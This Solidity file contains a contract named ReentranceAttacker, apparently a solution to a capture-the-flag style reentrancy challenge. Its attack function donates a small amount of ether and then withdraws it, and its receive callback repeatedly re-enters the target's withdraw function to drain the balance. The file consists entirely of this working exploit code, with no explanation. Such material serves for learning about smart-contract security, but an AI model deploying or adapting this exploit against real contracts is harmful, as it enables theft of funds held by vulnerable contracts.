// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);
}

contract ReentranceAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) payable {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        IReentrance(challengeInstance).donate{value: 0.001 ether}(address(this));
        IReentrance(challengeInstance).withdraw(0.001 ether);
    }
    
    receive() external payable {
        uint balance = IReentrance(challengeInstance).balanceOf(address(this));
        if (balance > 0) {
            IReentrance(challengeInstance).withdraw(balance);
        }
    }
}